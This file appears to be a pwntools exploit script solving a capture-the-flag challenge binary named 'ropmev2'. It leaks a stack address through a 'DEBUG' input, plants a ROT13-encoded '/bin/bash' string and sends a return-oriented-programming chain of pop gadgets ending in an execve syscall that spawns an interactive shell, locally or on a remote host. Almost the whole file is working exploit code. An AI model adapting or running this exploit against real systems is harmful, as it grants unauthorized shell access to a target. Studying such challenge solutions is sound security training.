from pwn import *

#Debug useage - python3 GDB
#Remote usage - python3 REMOTE <IP> <PORT>

def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)
		
		
gdbscript = '''
init-peda
b printf
c
'''.format(**locals())

exe = "./ropmev2"
elf = context.binary = ELF(exe, checksec=False)

context.log_level = "info"

io = start()

string = b"DEBUG"

io.sendlineafter(b"hack me", string)
leak = io.recvuntil('this is')
leak = io.recvline().split()[0].ljust(8,b'\x00')
leak = int(leak, 16)
leak -= 224
log.success(f'Leaked start of buffer address at: {hex(leak)}')

#Execve syscall- 
#RDI = */bin/sh
#RSI & RDX = /x00
#RAX = 59
#Syscall instruction

offset = 216

#/bin/bash after ROT13 encode
binsh = b"/ova/onfu\x00"
pad = b"\x90"*(offset - len(binsh))


pop_rdi = p64(0x000000000040142b) #0x000000000040142b pop rdi; ret
pbinsh = p64(leak)

pop_rsi_r15 = p64(0x0000000000401429) #0x0000000000401429 pop rsi; pop r15; ret
null = p64(0x00)

pop_rdx_r13 = p64(0x0000000000401164) #0x0000000000401164 pop rdx ; pop r13 ; ret

pop_rax = p64(0x0000000000401162) #0x0000000000401162 pop rax; ret
execve = p64(0x3b)

syscall = p64(0x0000000000401168)

payload = binsh + pad + pop_rdi + pbinsh + pop_rax + execve + pop_rsi_r15 + null + null + pop_rdx_r13 + null + null + syscall

io.sendline(payload)
io.interactive()

